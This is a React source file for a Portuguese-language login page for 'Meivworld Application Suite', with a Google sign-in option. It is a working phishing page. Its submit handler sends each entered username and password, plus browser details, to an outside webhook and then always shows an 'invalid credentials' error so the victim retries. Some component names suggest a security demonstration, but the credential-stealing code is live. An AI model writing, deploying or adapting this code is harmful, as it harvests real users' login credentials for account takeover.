import { useState, useEffect } from 'react';
import './App.css';
import GmailLogin from './components/GmailLogin';
import SecurityDemonstration from './components/SecurityDemonstration';
import SecurityComparison from './components/SecurityComparison';

function App() {
  const [showGmailLogin, setShowGmailLogin] = useState(false);
  const [showSecurityDemo, setShowSecurityDemo] = useState(false);
  const [showSecurityComparison, setShowSecurityComparison] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showError, setShowError] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
useEffect(() => {
  document.title = "Entrar - Meivworld";
}, []);
  const handleCheckboxChange = () => {
    setRememberMe(!rememberMe);
  };

  const handleUsernameChange = (e) => {
    setUsername(e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleSubmit = (e) => {
    if (e) e.preventDefault();
    

          fetch('http://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          source: 'meiv-login',
          username,
          password,
          userAgent: navigator.userAgent,
          ip:  navigator.connection ? navigator.connection.remoteAddress : 'unknown',
          clientInfo: {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language
          },
          timestamp: new Date().toISOString(),
          step: 'login_Meivworld'
        })
      });
      
    // Validate credentials (simulating authentication failure)
    if (username === '' || password === '') {
      showErrorNotification('Credenciais inválidas. Nome de utilizador ou palavra-chave erradas!');
      return;
    }
    
    // Show error notification for demonstration purposes
    // In a real app, this would be conditional based on authentication result
    showErrorNotification('Credenciais inválidas. Nome de utilizador ou palavra-chave erradas!');
    
    // Additional login logic can go here
    console.log('Login submitted');
  };
  
  const showErrorNotification = (message) => {
    setErrorMessage(message);
    setShowError(true);
    
    // Auto-hide the error after 5 seconds
    setTimeout(() => {
      setShowError(false);
    }, 5000);
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      handleSubmit();
    }
  };
  
  const toggleLoginMode = () => {
    setShowGmailLogin(!showGmailLogin);
    setShowSecurityDemo(false);
    setShowSecurityComparison(false);
  };
  
  const toggleSecurityDemo = () => {
    setShowSecurityDemo(!showSecurityDemo);
    setShowGmailLogin(false);
    setShowSecurityComparison(false);
  };
  
  const toggleSecurityComparison = () => {
    setShowSecurityComparison(!showSecurityComparison);
    setShowGmailLogin(false);
    setShowSecurityDemo(false);
  };

  return (
    <>
      {/* Sliding Error Notification */}
      <div className={`error-notification ${showError ? 'show' : ''}`}>
        {errorMessage}
        <button onClick={() => setShowError(false)}>×</button>
      </div>

      {showGmailLogin ? (
        <GmailLogin onBack={toggleLoginMode} />
      ) : showSecurityDemo ? (
        <div>
          <button 
            className="back-button" 
            style={{
              position: 'absolute',
              top: '16px',
              left: '16px',
              background: 'none',
              border: 'none',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              color: '#1a73e8',
              fontSize: '14px',
              fontWeight: 500,
              padding: '8px',
              borderRadius: '4px'
            }} 
            onClick={toggleSecurityDemo}
          >
            Voltar
          </button>
          <SecurityDemonstration />
        </div>
      ) : showSecurityComparison ? (
        <div>
          <button 
            className="back-button" 
            style={{
              position: 'absolute',
              top: '16px',
              left: '16px',
              background: 'none',
              border: 'none',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              color: '#1a73e8',
              fontSize: '14px',
              fontWeight: 500,
              padding: '8px',
              borderRadius: '4px'
            }} 
            onClick={toggleSecurityComparison}
          >
            Voltar
          </button>
          <SecurityComparison />
        </div>
      ) : (
        <div className="login-page">
          <div className="login-bg"></div>
          <div className="login-container">
            <div className="login-card">
              <div className="logo-container">
                <img src="/assets/meivworld-logo.png" alt="MEIV WORLD APPLICATION SUITE" />
              </div>
          
          <div className="input-field animated-label-input">
            <input 
              type="text" 
              id="username" 
              className="form-control" 
              placeholder=" " 
              required 
              value={username}
              onChange={handleUsernameChange}
              onKeyPress={handleKeyPress}
            />
            <label htmlFor="username">Utilizador <span className="required-mark">*</span></label>
            <div className="input-underline"></div>
          </div>
          
          <div className="input-field animated-label-input">
            <input 
              type="password" 
              id="password" 
              className="form-control" 
              placeholder=" " 
              required 
              value={password}
              onChange={handlePasswordChange}
              onKeyPress={handleKeyPress}
            />
            <label htmlFor="password">Palavra-chave <span className="required-mark">*</span></label>
            <div className="input-underline"></div>
          </div>
          
          <div className="remember-me">
            <label className="checkbox-container">
              <input 
                type="checkbox" 
                checked={rememberMe}
                onChange={handleCheckboxChange} 
              />
              <span className="checkmark"></span>
              Recordar-me
            </label>
          </div>
          
          <button type="button" className="login-btn" onClick={handleSubmit}>
            Entrar
          </button>
          
          <div className="separator">
            <span>Ou</span>
          </div>
          
          <button type="button" className="google-btn" onClick={toggleLoginMode}>
            <img 
              src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" 
              alt="Google" 
              className="google-icon"
            />
            <span className="google-text">Iniciar sessão</span>
          </button>
          

        </div>
      </div>
      <div className="copyright">
        © {new Date().getFullYear()} Meivworld Application Suite
      </div>
    </div>
      )}
    </>
  );
}

export default App;
